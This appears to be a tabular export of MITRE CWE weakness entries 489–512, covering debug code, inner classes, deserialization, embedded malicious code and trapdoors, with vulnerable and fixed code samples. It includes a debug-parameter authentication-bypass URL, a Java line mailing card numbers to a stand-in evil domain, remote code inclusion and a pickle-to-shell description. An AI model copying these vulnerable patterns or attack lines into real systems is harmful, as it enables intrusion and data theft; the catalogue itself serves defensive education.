CWE-489: Active Debug Code,"The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.","Scope: ConfidentialityIntegrityAvailabilityAccess ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; Read Application Data; Gain Privileges or Assume Identity; Varies by ContextThe severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access., Likelihood: ","Example 1Debug code can be used to bypass authentication. For example, suppose an application has a login script that receives a username and a password. Assume also that a third, optional, parameter, called ""debug"", is interpreted by the script as requesting a switch to debug mode, and that when this parameter is given the username and password are not checked. In such a case, it is very simple to bypass the authentication process if the special behavior of the application regarding the debug parameter is known. In a case where the form is:(bad code)Example Language:HTML<FORM ACTION=""/authenticate_login.cgi""><INPUT TYPE=TEXT name=username><INPUT TYPE=PASSWORD name=password><INPUT TYPE=SUBMIT></FORM>Then a conforming link will look like:(informative)http://TARGET/authenticate_login.cgi?username=...&password=...An attacker can change this to:(attack code)http://TARGET/authenticate_login.cgi?username=&password=&debug=1Which will grant the attacker access to the site, bypassing the authentication process.",Phases:  Build and Compilation; DistributionRemove debug code before deploying the application.
CWE CATEGORY: DEPRECATED: Mobile Code Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-491: Public cloneable() Method Without Final ('Object Hijack'),"A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Varies by Context, Likelihood: ","Example 1In this example, a public class ""BankAccount"" implements the cloneable() method which declares ""Object clone(string accountnumber)"":(bad code)Example Language:Javapublic class BankAccount implements Cloneable{public Object clone(String accountnumber) throwsCloneNotSupportedException{Object returnMe = new BankAccount(account number);...}}Example 2In the example below, a clone() method is defined without being declared final.(bad code)Example Language:Javaprotected Object clone() throws CloneNotSupportedException {...}",Phase:  ImplementationMake the cloneable() method final.
CWE-492: Use of Inner Class Containing Sensitive Data,Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data""Inner Classes"" data confidentiality aspects can often be overcome., Likelihood: ","Example 1The following Java Applet code mistakenly makes use of an inner class.(bad code)Example Language:Javapublic final class urlTool extends Applet {private final class urlHelper {...}...}Example 2The following example shows a basic use of inner classes. The class OuterClass contains the private member inner class InnerClass. The private inner class InnerClass includes the method concat that accesses the private member variables of the class OuterClass to output the value of one of the private member variables of the class OuterClass and returns a string that is a concatenation of one of the private member variables of the class OuterClass, the separator input parameter of the method and the private member variable of the class InnerClass.(bad code)Example Language:Javapublic class OuterClass {// private member variables of OuterClassprivate String memberOne;private String memberTwo;// constructor of OuterClasspublic OuterClass(String varOne, String varTwo) {this.memberOne = varOne;this.memberTwo = varTwo;}// InnerClass is a member inner class of OuterClassprivate class InnerClass {private String innerMemberOne;public InnerClass(String innerVarOne) {this.innerMemberOne = innerVarOne;}public String concat(String separator) {// InnerClass has access to private member variables of OuterClassSystem.out.println(""Value of memberOne is: "" + memberOne);return OuterClass.this.memberTwo + separator + this.innerMemberOne;}}}Although this is an acceptable use of inner classes it demonstrates one of the weaknesses of inner classes that inner classes have complete access to all member variables and methods of the enclosing class even those that are declared private and protected. When inner classes are compiled and translated into Java bytecode the JVM treats the inner class as a peer class with package level access to the enclosing class.To avoid this weakness of inner classes, consider using either static inner classes, local inner classes, or anonymous inner classes.The following Java example demonstrates the use of static inner classes using the previous example. The inner class InnerClass is declared using the static modifier that signifies that InnerClass is a static member of the enclosing class OuterClass. By declaring an inner class as a static member of the enclosing class, the inner class can only access other static members and methods of the enclosing class and prevents the inner class from accessing nonstatic member variables and methods of the enclosing class. In this case the inner class InnerClass can only access the static member variable memberTwo of the enclosing class OuterClass but cannot access the nonstatic member variable memberOne.(good code)Example Language:Javapublic class OuterClass {// private member variables of OuterClassprivate String memberOne;private static String memberTwo;// constructor of OuterClasspublic OuterClass(String varOne, String varTwo) {this.memberOne = varOne;this.memberTwo = varTwo;}// InnerClass is a static inner class of OuterClassprivate static class InnerClass {private String innerMemberOne;public InnerClass(String innerVarOne) {this.innerMemberOne = innerVarOne;}public String concat(String separator) {// InnerClass only has access to static member variables of OuterClassreturn memberTwo + separator + this.innerMemberOne;}}}The only limitation with using a static inner class is that as a static member of the enclosing class the inner class does not have a reference to instances of the enclosing class. For many situations this may not be ideal. An alternative is to use a local inner class or an anonymous inner class as shown in the next examples.Example 3In the following example the BankAccount class contains the private member inner class InterestAdder that adds interest to the bank account balance. The start method of the BankAccount class creates an object of the inner class InterestAdder, the InterestAdder inner class implements the ActionListener interface with the method actionPerformed. A Timer object created within the start method of the BankAccount class invokes the actionPerformed method of the InterestAdder class every 30 days to add the interest to the bank account balance based on the interest rate passed to the start method as an input parameter. The inner class InterestAdder needs access to the private member variable balance of the BankAccount class in order to add the interest to the bank account balance.However as demonstrated in the previous example, because InterestAdder is a non-static member inner class of the BankAccount class, InterestAdder also has access to the private member variables of the BankAccount class - including the sensitive data contained in the private member variables for the bank account owner's name, Social Security number, and the bank account number.(bad code)Example Language:Javapublic class BankAccount {// private member variables of BankAccount classprivate String accountOwnerName;private String accountOwnerSSN;private int accountNumber;private double balance;// constructor for BankAccount classpublic BankAccount(String accountOwnerName, String accountOwnerSSN,int accountNumber, double initialBalance, int initialRate){this.accountOwnerName = accountOwnerName;this.accountOwnerSSN = accountOwnerSSN;this.accountNumber = accountNumber;this.balance = initialBalance;this.start(initialRate);}// start method will add interest to balance every 30 days// creates timer object and interest adding action listener objectpublic void start(double rate){ActionListener adder = new InterestAdder(rate);Timer t = new Timer(1000 * 3600 * 24 * 30, adder);t.start();}// InterestAdder is an inner class of BankAccount class// that implements the ActionListener interfaceprivate class InterestAdder implements ActionListener{private double rate;public InterestAdder(double aRate){this.rate = aRate;}public void actionPerformed(ActionEvent event){// update interestdouble interest = BankAccount.this.balance * rate / 100;BankAccount.this.balance += interest;}}}In the following example the InterestAdder class from the above example is declared locally within the start method of the BankAccount class. As a local inner class InterestAdder has its scope restricted to the method (or enclosing block) where it is declared, in this case only the start method has access to the inner class InterestAdder, no other classes including the enclosing class has knowledge of the inner class outside of the start method. This allows the inner class to access private member variables of the enclosing class but only within the scope of the enclosing method or block.(good code)Example Language:Javapublic class BankAccount {// private member variables of BankAccount classprivate String accountOwnerName;private String accountOwnerSSN;private int accountNumber;private double balance;// constructor for BankAccount classpublic BankAccount(String accountOwnerName, String accountOwnerSSN,int accountNumber, double initialBalance, int initialRate){this.accountOwnerName = accountOwnerName;this.accountOwnerSSN = accountOwnerSSN;this.accountNumber = accountNumber;this.balance = initialBalance;this.start(initialRate);}// start method will add interest to balance every 30 days// creates timer object and interest adding action listener objectpublic void start(final double rate){// InterestAdder is a local inner class// that implements the ActionListener interfaceclass InterestAdder implements ActionListener{public void actionPerformed(ActionEvent event){// update interestdouble interest = BankAccount.this.balance * rate / 100;BankAccount.this.balance += interest;}}ActionListener adder = new InterestAdder();Timer t = new Timer(1000 * 3600 * 24 * 30, adder);t.start();}}A similar approach would be to use an anonymous inner class as demonstrated in the next example. An anonymous inner class is declared without a name and creates only a single instance of the inner class object. As in the previous example the anonymous inner class has its scope restricted to the start method of the BankAccount class.(good code)Example Language:Javapublic class BankAccount {// private member variables of BankAccount classprivate String accountOwnerName;private String accountOwnerSSN;private int accountNumber;private double balance;// constructor for BankAccount classpublic BankAccount(String accountOwnerName, String accountOwnerSSN,int accountNumber, double initialBalance, int initialRate){this.accountOwnerName = accountOwnerName;this.accountOwnerSSN = accountOwnerSSN;this.accountNumber = accountNumber;this.balance = initialBalance;this.start(initialRate);}// start method will add interest to balance every 30 days// creates timer object and interest adding action listener objectpublic void start(final double rate){// anonymous inner class that implements the ActionListener interfaceActionListener adder = new ActionListener(){public void actionPerformed(ActionEvent event){double interest = BankAccount.this.balance * rate / 100;BankAccount.this.balance += interest;}};Timer t = new Timer(1000 * 3600 * 24 * 30, adder);t.start();}}Example 4In the following Java example a simple applet provides the capability for a user to input a URL into a text field and have the URL opened in a new browser window. The applet contains an inner class that is an action listener for the submit button, when the user clicks the submit button the inner class action listener's actionPerformed method will open the URL entered into the text field in a new browser window. As with the previous examples using inner classes in this manner creates a security risk by exposing private variables and methods. Inner classes create an additional security risk with applets as applets are executed on a remote machine through a web browser within the same JVM and therefore may run side-by-side with other potentially malicious code.(bad code)public class UrlToolApplet extends Applet {// private member variables for applet componentsprivate Label enterUrlLabel;private TextField enterUrlTextField;private Button submitButton;// init method that adds components to applet// and creates button listener objectpublic void init() {setLayout(new FlowLayout());enterUrlLabel = new Label(""Enter URL: "");enterUrlTextField = new TextField("""", 20);submitButton = new Button(""Submit"");add(enterUrlLabel);add(enterUrlTextField);add(submitButton);ActionListener submitButtonListener = new SubmitButtonListener();submitButton.addActionListener(submitButtonListener);}// button listener inner class for UrlToolApplet classprivate class SubmitButtonListener implements ActionListener {public void actionPerformed(ActionEvent evt) {if (evt.getSource() == submitButton) {String urlString = enterUrlTextField.getText();URL url = null;try {url = new URL(urlString);} catch (MalformedURLException e) {System.err.println(""Malformed URL: "" + urlString);}if (url != null) {getAppletContext().showDocument(url);}}}}}As with the previous examples a solution to this problem would be to use a static inner class, a local inner class or an anonymous inner class. An alternative solution would be to have the applet implement the action listener rather than using it as an inner class as shown in the following example.(good code)Example Language:Javapublic class UrlToolApplet extends Applet implements ActionListener {// private member variables for applet componentsprivate Label enterUrlLabel;private TextField enterUrlTextField;private Button submitButton;// init method that adds components to appletpublic void init() {setLayout(new FlowLayout());enterUrlLabel = new Label(""Enter URL: "");enterUrlTextField = new TextField("""", 20);submitButton = new Button(""Submit"");add(enterUrlLabel);add(enterUrlTextField);add(submitButton);submitButton.addActionListener(this);}// implementation of actionPerformed method of ActionListener interfacepublic void actionPerformed(ActionEvent evt) {if (evt.getSource() == submitButton) {String urlString = enterUrlTextField.getText();URL url = null;try {url = new URL(urlString);} catch (MalformedURLException e) {System.err.println(""Malformed URL: "" + urlString);}if (url != null) {getAppletContext().showDocument(url);}}}}","Phase:  ImplementationUsing sealed classes protects object-oriented encapsulation paradigms and therefore protects code from being extended in unforeseen ways.Phase:  ImplementationInner Classes do not provide security. Warning: Never reduce the security of the object from an outer class, going to an inner class. If an outer class is final or private, ensure that its inner class is private as well."
CWE-493: Critical Public Variable Without Final Modifier,"The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.","Scope: Integrity, Impact: Technical Impact:Modify Application DataThe object could potentially be tampered with., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe object could potentially allow the object to be read., Likelihood: ","Example 1Suppose this WidgetData class is used for an e-commerce web site. The programmer attempts to prevent price-tampering attacks by setting the price of the widget using the constructor.(bad code)Example Language:Javapublic final class WidgetData extends Applet {public float price;...public WidgetData(...) {this.price = LookupPrice(""MyWidgetType"");}}The price field is not final. Even though the value is set by the constructor, it could be modified by anybody that has access to an instance of WidgetData.Example 2Assume the following code is intended to provide the location of a configuration file that controls execution of the application.(bad code)Example Language:C++public string configPath = ""/etc/application/config.dat"";(bad code)Example Language:Javapublic String configPath = new String(""/etc/application/config.dat"");While this field is readable from any function, and thus might allow an information leak of a pathname, a more serious problem is that it can be changed by any function.","Phase:  ImplementationDeclare all public fields as final when possible, especially if it is used to maintain internal state of an Applet or of classes used by an Applet. If a field must be public, then perform all appropriate sanity checks before accessing the field from your code."
CWE-494: Download of Code Without Integrity Check,The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.,"Scope: IntegrityAvailabilityConfidentialityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Alter Execution Logic; OtherExecuting untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users., Likelihood: ","Example 1This example loads an external class from a local subdirectory.(bad code)Example Language:JavaURL[] classURLs= new URL[]{new URL(""file:subdir/"")};URLClassLoader loader = new URLClassLoader(classURLs);Class loadedClass = Class.forName(""loadMe"", true, loader);This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.Example 2This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.(bad code)Example Language:PHP//assume the password is already encrypted, avoidingCWE-312function authenticate($username,$password){include(""http://external.example.com/dbInfo.php"");//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname availablemysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');mysql_select_db($dbname);$query = 'Select * from users where username='.$username.' And password='.$password;$result = mysql_query($query);if(mysql_numrows($result) == 1){mysql_close();return true;}else{mysql_close();return false;}}This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account.This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack.","Phase:  ImplementationPerform proper forward and reverse DNS lookups to detect DNS spoofing.Note:This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit.Phases:  Architecture and Design; OperationEncrypt the code with a reliable encryption scheme before transmitting.This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not containCWE-295,CWE-320,CWE-347, and related weaknesses.Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-495: Private Data Structure Returned From A Public Method,"The product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.","Scope: Integrity, Impact: Technical Impact:Modify Application DataThe contents of the data structure can be modified from outside the intended scope., Likelihood: ","Example 1Here, a public method in a Java class returns a reference to a private array. Given that arrays in Java are mutable, any modifications made to the returned reference would be reflected in the original private array.(bad code)Example Language:Javaprivate String[] colors;public String[] getColors() {return colors;}Example 2In this example, the Color class defines functions that return non-const references to private members (an array type and an integer type), which are then arbitrarily altered from outside the control of the class.(bad code)Example Language:C++class Color{private:int[2] colorArray;int colorValue;public:Color () : colorArray { 1, 2 }, colorValue (3) { };int[2] & fa () { return colorArray; }// return reference to private arrayint & fv () { return colorValue; }// return reference to private integer};int main (){Color c;c.fa () [1] = 42;// modifies private array elementc.fv () = 42;// modifies private intreturn 0;}",Phase:  ImplementationDeclare the method private.Phase:  ImplementationClone the member data and keep an unmodified version of the data private to the object.Phase:  ImplementationUse public setter methods that govern how a private member can be modified.
CWE-496: Public Data Assigned to Private Array-Typed Field,Assigning public data to a private array is equivalent to giving public access to the array.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataThe contents of the array can be modified from outside the intended scope., Likelihood: ","Example 1In the example below, the setRoles() method assigns a publically-controllable array to a private field, thus allowing the caller to modify the private array directly by virtue of the fact that arrays in Java are mutable.(bad code)Example Language:Javaprivate String[] userRoles;public void setUserRoles(String[] userRoles) {this.userRoles = userRoles;}",Phase:  ImplementationDo not allow objects to modify private members of a class.
CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere,The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code prints the path environment variable to the standard error stream:(bad code)Example Language:Cchar* path = getenv(""PATH"");...sprintf(stderr, ""cannot find exe on path %s\n"", path);Example 2This code prints all of the running processes belonging to the current user.(bad code)Example Language:PHP//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoidingCWE-78)$userName = getCurrentUser();$command = 'ps aux | grep ' . $userName;system($command);If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.Example 3The following code prints an exception to the standard error stream:(bad code)Example Language:Javatry {...} catch (Exception e) {e.printStackTrace();}(bad code)try {...} catch (Exception e) {Console.Writeline(e);}Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system will be vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.Example 4The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console.(bad code)Example Language:C#string cs=""database=northwind; server=mySQLServer..."";SqlConnection conn=new SqlConnection(cs);...Console.Writeline(cs);Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.",Phases:  Architecture and Design; ImplementationProduction applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs
CWE-498: Cloneable Class Containing Sensitive Information,"The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismA class that can be cloned can be produced without executing the constructor. This is dangerous since the constructor may perform security-related checks. By allowing the object to be cloned, those checks may be bypassed., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Javapublic class CloneClient {public CloneClient() //throwsjava.lang.CloneNotSupportedException {Teacher t1 = new Teacher(""guddu"",""22,nagar road"");//...// Do some stuff to remove the teacher.Teacher t2 = (Teacher)t1.clone();System.out.println(t2.name);}public static void main(String args[]) {new CloneClient();}}class Teacher implements Cloneable {public Object clone() {try {return super.clone();}catch (java.lang.CloneNotSupportedException e) {throw new RuntimeException(e.toString());}}public String name;public String clas;public Teacher(String name,String clas) {this.name = name;this.clas = clas;}}Make classes uncloneable by defining a clone function like:(good code)Example Language:Javapublic final void clone() throws java.lang.CloneNotSupportedException {throw new java.lang.CloneNotSupportedException();}","Phase:  ImplementationIf you do make your classes clonable, ensure that your clone method is final and throw super.clone()."
CWE-499: Serializable Class Containing Sensitive Data,"The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.","Scope: Confidentiality, Impact: Technical Impact:Read Application Dataan attacker can write out the class to a byte stream, then extract the important data from it., Likelihood: ","Example 1This code creates a new record for a medical patient:(bad code)Example Language:Javaclass PatientRecord {private String name;private String socialSecurityNum;public Patient(String name,String ssn) {this.SetName(name);this.SetSocialSecurityNumber(ssn);}}This object does not explicitly deny serialization, allowing an attacker to serialize an instance of this object and gain a patient's name and Social Security number even though those fields are private.","Phase:  ImplementationIn Java, explicitly define final writeObject() to prevent serialization. This is the recommended solution. Define the writeObject() function to throw an exception explicitly denying serialization.Phase:  ImplementationMake sure to prevent serialization of your objects."
CWE-500: Public Static Field Not Marked Final,"An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.","Scope: Integrity, Impact: Technical Impact:Modify Application DataThe object could potentially be tampered with., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe object could potentially allow the object to be read., Likelihood: ","Example 1The following examples use of a public static String variable to contain the name of a property/configuration file for the application.(bad code)Example Language:C++class SomeAppClass {public:static string appPropertiesConfigFile = ""app/properties.config"";...}(bad code)Example Language:Javapublic class SomeAppClass {public static String appPropertiesFile = ""app/Application.properties"";...}Having a public static variable that is not marked final (constant) may allow the variable to the altered in a way not intended by the application. In this example the String variable can be modified to indicate a different on nonexistent properties file which could cause the application to crash or caused unexpected behavior.(good code)Example Language:C++class SomeAppClass {public:static const string appPropertiesConfigFile = ""app/properties.config"";...}(good code)Example Language:Javapublic class SomeAppClass {public static final String appPropertiesFile = ""app/Application.properties"";...}","Phase:  Architecture and DesignClearly identify the scope for all critical data elements, including whether they should be regarded as static.Phase:  ImplementationMake any static fields private and constant.A constant field is denoted by the keyword 'const' in C/C++ and ' final' in Java"
CWE-501: Trust Boundary Violation,The product mixes trusted and untrusted data in the same data structure or structured message.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated.(bad code)Example Language:Javausrname = request.getParameter(""usrname"");if (session.getAttribute(ATTR_USR) == null) {session.setAttribute(ATTR_USR, usrname);}(bad code)Example Language:C#usrname = request.Item(""usrname"");if (session.Item(ATTR_USR) == null) {session.Add(ATTR_USR, usrname);}Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.",无可能的缓解方案
CWE-502: Deserialization of Untrusted Data,The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.,"Scope: Integrity, Impact: Technical Impact:Modify Application Data; Unexpected StateAttackers can modify unexpected objects or data that was assumed to be safe from modification., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU)If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate., Likelihood: ; Scope: Other, Impact: Technical Impact:Varies by ContextThe consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation., Likelihood: ","Example 1This code snippet deserializes an object from a file and uses it as a UI button:(bad code)Example Language:Javatry {File file = new File(""object.obj"");ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));javax.swing.JButton button = (javax.swing.JButton) in.readObject();in.close();}This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:(good code)Example Language:Javaprivate final void readObject(ObjectInputStream in) throws java.io.IOException {throw new java.io.IOException(""Cannot be deserialized""); }Example 2In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.(bad code)Example Language:Pythontry {class ExampleProtocol(protocol.Protocol):def dataReceived(self, data):# Code that would be here would parse the incoming data# After receiving headers, call confirmAuth() to authenticatedef confirmAuth(self, headers):try:token = cPickle.loads(base64.b64decode(headers['AuthToken']))if not check_hmac(token['signature'], token['data'], getSecretKey()):raise AuthFailself.secure_data = token['data']except:raise AuthFail}Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object ""AuthToken"" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.","Phases:  Architecture and Design; ImplementationIf available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.Phase:  ImplementationWhen deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.Phase:  ImplementationExplicitly define a final object() to prevent deserialization.Phases:  Architecture and Design; ImplementationMake fields transient to protect them from deserialization.An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.Phase:  ImplementationAvoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation."
CWE CATEGORY: DEPRECATED: Byte/Object Code,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Motivation/Intent,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Intentionally Introduced Weakness,"This category has been deprecated as it was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-506: Embedded Malicious Code,The product contains code that appears to be malicious in nature.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1In the example below, a malicous developer has injected code to send credit card numbers to the developer's own email address.(bad code)Example Language:Javaboolean authorizeCard(String ccn) {// Authorize credit card....mailCardNumber(ccn, ""evil_developer@evil_domain.com"");}","Phase:  TestingRemove the malicious code and start an effort to ensure that no more malicious code exists. This may require a detailed review of all code, as it is possible to hide a serious attack in only one or two lines of code. These lines may be located almost anywhere in an application and may have been intentionally obfuscated by the attacker."
CWE-507: Trojan Horse,"The product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,Phase:  OperationMost antivirus software scans for Trojan Horses.Phase:  InstallationVerify the integrity of the product that is being installed.
CWE-508: Non-Replicating Malicious Code,Non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,Phase:  OperationAntivirus software can help mitigate known malicious code.Phase:  InstallationVerify the integrity of the software that is being installed.
CWE-509: Replicating Malicious Code (Virus or Worm),"Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,Phase:  OperationAntivirus software scans for viruses or worms.Phase:  InstallationAlways verify the integrity of the software that is being installed.
CWE-510: Trapdoor,"A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  InstallationAlways verify the integrity of the software that is being installed.Phase:  TestingIdentify and closely inspect the conditions for entering privileged areas of the code, especially those related to authentication, process invocation, and network communications."
CWE-511: Logic/Time Bomb,"The product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.","Scope: OtherIntegrity, Impact: Technical Impact:Varies by Context; Alter Execution Logic, Likelihood: ","Example 1Typical examples of triggers include system date or time mechanisms, random number generators, and counters that wait for an opportunity to launch their payload. When triggered, a time-bomb may deny service by crashing the system, deleting files, or degrading system response-time.","Phase:  InstallationAlways verify the integrity of the product that is being installed.Phase:  TestingConduct a code coverage analysis using live testing, then closely inspect any code that is not covered."
CWE-512: Spyware,"The product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,Phase:  OperationUse spyware detection and removal software.Phase:  InstallationAlways verify the integrity of the product that is being installed.
CWE CATEGORY: DEPRECATED: Intentionally Introduced Nonmalicious Weakness,"This category has been deprecated as it was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
